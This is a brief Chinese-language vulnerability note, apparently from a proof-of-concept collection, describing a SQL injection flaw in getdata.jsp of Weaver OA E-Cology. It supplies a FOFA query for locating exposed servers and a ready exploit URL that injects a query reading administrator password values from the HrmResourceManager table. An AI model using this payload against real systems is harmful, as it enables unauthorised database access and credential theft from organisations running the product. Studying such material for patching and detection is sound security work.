## 泛微OA-E-Cology-Getdata.jsp存在SQL注入漏洞

泛微OA E-Cology是一款面向中大型组织的数字化办公产品，它基于全新的设计理念和管理思想，旨在为中大型组织创建一个全新的高效协同办公环境。泛微OA E-Cology Getdata.jsp存在SQL注入漏洞，允许攻击者非法访问和操作数据库，可能导致数据泄露、篡改、删除，甚至控制整个服务器。

## fofa

```
app="泛微-OA（e-cology）"
```

## poc

```
http://{{Hostname}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

![image-20240523193537075](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405231935132.png)